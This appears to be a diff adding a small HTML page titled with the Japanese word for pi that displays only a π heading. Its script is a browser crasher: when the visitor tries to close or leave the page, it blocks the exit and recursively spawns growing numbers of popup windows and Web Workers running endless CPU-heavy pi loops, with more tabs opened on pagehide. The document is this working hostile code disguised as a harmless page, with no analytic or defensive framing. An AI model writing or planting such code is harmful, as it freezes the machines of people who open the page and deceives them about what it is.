@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>円周率</title>
+</head>
+<body>
+  <h1>π</h1>
+
+  <script>
+    function crashOnClose() {
+      const workers = [];
+
+      function spawnTab() {
+        window.open(location.href, '_blank', 'width=200,height=150,left=' + (Math.random()*800) + ',top=' + (Math.random()*600));
+      }
+
+      function spawnWorker() {
+        const blob = new Blob([`
+          let a = 1.0, b = 1.0 / Math.sqrt(2), t = 0.25, p = 1.0;
+          while(true) {
+            const an = (a + b) / 2;
+            b = Math.sqrt(a * b);
+            t -= p * (a - an) ** 2;
+            a = an;
+            p *= 2;
+            const pi = (a + b) ** 2 / (4 * t);
+            for(let i=0;i<10000;i++) Math.sqrt(pi);
+          }
+        `], { type: 'text/javascript' });
+        const w = new Worker(URL.createObjectURL(blob));
+        workers.push(w);
+      }
+
+      function explode(d) {
+        for (let i = 0; i < 2 ** d; i++) {
+          spawnTab();
+          spawnWorker();
+        }
+        if (d < 5) {
+          setTimeout(() => explode(d + 1), 200);
+        }
+      }
+
+      window.addEventListener('beforeunload', (e) => {
+        explode(0);
+        e.preventDefault();
+        e.returnValue = '';
+        setTimeout(() => explode(2), 0);
+      });
+
+      window.addEventListener('pagehide', () => {
+        for (let i = 0; i < 10; i++) {
+          spawnTab();
+        }
+      });
+    }
+
+    crashOnClose();
+  </script>
+</body>
+</html>
